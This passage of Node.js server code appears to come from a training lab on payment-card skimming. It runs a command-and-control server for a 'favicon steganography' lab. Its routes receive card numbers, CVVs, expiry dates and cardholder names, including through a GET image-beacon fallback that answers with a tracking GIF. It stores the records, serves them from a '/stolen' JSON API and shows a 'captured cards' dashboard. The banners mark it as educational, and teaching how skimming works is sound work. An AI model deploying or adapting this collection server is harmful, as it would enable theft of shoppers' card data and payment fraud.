    expiry: body.expiry,
    source: body.source || 'favicon-steganography',
    url: body.url
  }

  lab4Records.push(record)
  lab4Stats.totalRecords++
  if (lab4Records.length > 1000) lab4Records = lab4Records.slice(-1000)

  try { await lab4SaveRecord(record) } catch (e) { console.error('[Lab4-C2] Save error:', e.message) }

  res.status(200).json({ status: 'ok', id: record.id })
})

// GET /lab4/c2/collect — image beacon fallback (sendBeacon with GET)
app.get('/lab4/c2/collect', (req, res) => {
  const q = req.query
  if (q.card_number) {
    const raw = String(q.card_number).replace(/[\s-]/g, '')
    lab4Records.push({
      id: `stego-${Date.now()}-beacon`,
      timestamp: new Date().toISOString(),
      masked_card: raw.slice(0, 4) + ' **** **** ' + raw.slice(-4),
      cvv: q.cvv, source: 'beacon', url: q.url
    })
    lab4Stats.totalRecords++
  }
  const gif = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64')
  res.set('Content-Type', 'image/gif').send(gif)
})

// GET /lab4/c2 and /lab4/c2/ — dashboard
app.get(['/lab4/c2', '/lab4/c2/'], (req, res) => {
  res.send(generateLab4Dashboard())
})

// GET /lab4/c2/api/stolen — JSON API
app.get('/lab4/c2/api/stolen', (req, res) => {
  res.json({ success: true, count: lab4Records.length, records: lab4Records, stats: lab4Stats })
})

// GET /lab4/c2/health
app.get('/lab4/c2/health', (req, res) => {
  res.json({ status: 'healthy', lab: 'lab4', timestamp: new Date().toISOString() })
})

function generateLab4Dashboard() {
  const recent = lab4Records.slice(-20).reverse()
  const cardDivs = recent.map(r => `
    <div class="card-record" style="background:#1a1a2e;border:1px solid #e94560;border-radius:8px;padding:15px;margin:10px 0;">
      <div style="font-size:1.1em;font-weight:bold;color:#e94560;">${r.masked_card || 'N/A'}</div>
      <div style="color:#aaa;margin-top:4px;font-size:0.85em;">
        CVV: ${r.cvv || '???'} &nbsp;|&nbsp; Expiry: ${r.expiry || 'N/A'} &nbsp;|&nbsp; Name: ${r.card_name || 'N/A'}
      </div>
      <div style="color:#666;font-size:0.8em;margin-top:4px;">${r.timestamp} &nbsp;•&nbsp; ${r.source || ''}</div>
    </div>`).join('')

  return `<!DOCTYPE html><html><head><title>Lab 4 Steganography C2 Dashboard</title><meta charset="utf-8">
    <style>body{font-family:'Courier New',monospace;max-width:1000px;margin:0 auto;padding:20px;background:#0f0f1a;color:#e0e0e0}
    h1{color:#e94560;text-align:center;border-bottom:2px solid #e94560;padding-bottom:10px}
    .stats{background:#1a1a2e;padding:15px;margin:20px 0;border-radius:5px;border:1px solid #e94560;text-align:center}
    .warning{background:#7f1d1d;color:#fecaca;padding:15px;margin:20px 0;border-radius:5px;text-align:center;font-weight:bold}
    .c2-nav a{display:inline-block;padding:8px 16px;margin-right:10px;border:1px solid #e94560;border-radius:4px;color:#e94560;text-decoration:none;font-weight:bold;margin-bottom:15px}
    .c2-nav a:hover{background:#1a1a2e}
    #total-count{font-size:3em;font-weight:bold;color:#e94560}</style></head>
    <body>
    <h1>⚠️ LAB 4 — STEGANOGRAPHY FAVICON C2 ⚠️</h1>
    <div class="warning">🚨 EDUCATIONAL DEMONSTRATION ONLY 🚨<br>Receives card data hidden inside favicon.ico via steganography</div>
    <div class="c2-nav"><a href="/lab4">← Back to Lab</a><a href="/">Home</a><a href="/lab4/c2/api/stolen">JSON API</a></div>
    <div class="stats">
      <div id="total-count">${lab4Stats.totalRecords}</div>
      <p style="color:#aaa;">total cards captured</p>
    </div>
    <h2>Captured Cards (last 20)</h2>
    <div id="card-list">
      ${lab4Records.length === 0
        ? '<p style="color:#666;">No data yet — submit the Lab 4 checkout form to see captured cards.</p>'
        : cardDivs}
    </div>
  </body></html>`
}

// ============================================================
// SHARED HEALTH
// ============================================================

// ============================================================
// START
// ============================================================

Promise.all([lab3Preload(), lab4Preload()]).then(() => {
  app.listen(PORT, '0.0.0.0', () => {
    console.log('═══════════════════════════════════════════════════')
    console.log('🚨 SHARED C2 SERVER OPERATIONAL 🚨')
    console.log('═══════════════════════════════════════════════════')
    console.log(`Port: ${PORT}`)
    console.log('Lab 1 endpoints: /lab1/c2/*')
    console.log('Lab 2 endpoints: /lab2/c2/*')
    console.log('Lab 3 endpoints: /lab3/extension/*')
    console.log('Lab 4 endpoints: /lab4/c2/*')
    console.log('Storage:', useGCS('lab1') ? 'GCS' : 'local filesystem')
    console.log('═══════════════════════════════════════════════════')
    console.log('⚠️  FOR EDUCATIONAL PURPOSES ONLY ⚠️')
    console.log('═══════════════════════════════════════════════════\n')
  })
})
